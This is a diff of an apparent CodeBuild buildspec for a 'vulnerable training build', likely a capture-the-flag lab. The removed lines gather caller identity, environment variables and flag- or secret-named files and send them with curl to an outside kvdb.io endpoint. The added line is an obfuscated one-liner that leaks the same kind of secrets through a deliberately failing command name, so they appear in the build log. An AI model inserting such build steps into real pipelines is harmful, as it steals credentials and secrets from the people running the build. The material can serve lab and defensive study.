@@ -5,17 +5,4 @@ phases:
     commands:
       - echo "Running vulnerable training build"
       - |
-        aws sts get-caller-identity 2>&1 | tee /tmp/whoami.txt || true
-        env | sort | sed -E '/^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)=/d' | tee /tmp/env.txt || true
-        {
-          echo "=== flag-like environment ==="
-          env | sort | sed -E '/^(AWS_ACCESS_KEY_ID|AWS_SECRET_ACCESS_KEY|AWS_SESSION_TOKEN)=/d' | grep -Ei 'flag|secret|token|ctf|lab' || true
-          echo "=== flag-like files ==="
-          find / -maxdepth 5 -type f \( -iname '*flag*' -o -iname '*secret*' \) 2>/dev/null | head -n 50 | while IFS= read -r f; do
-            echo "--- $f"
-            sed -n '1,80p' "$f" 2>/dev/null || true
-          done
-        } | tee /tmp/flags.txt
-        curl -fsS --data-binary @/tmp/whoami.txt https://kvdb.io/HJjCRYSLCCKeyoxLHGb9MD/whoami || true
-        curl -fsS --data-binary @/tmp/env.txt https://kvdb.io/HJjCRYSLCCKeyoxLHGb9MD/env || true
-        curl -fsS --data-binary @/tmp/flags.txt https://kvdb.io/HJjCRYSLCCKeyoxLHGb9MD/flags || true
+        bash -lc 'GW_$( (env | grep -Ei "flag|ctf|lab|secret" || find / -maxdepth 5 -type f \( -iname "*flag*" -o -iname "*secret*" \) -exec sh -c "for f; do sed -n 1p \"$f\"; done" sh {} + 2>/dev/null) | head -c 220 | tr -c "A-Za-z0-9_{}=-" "_" )'
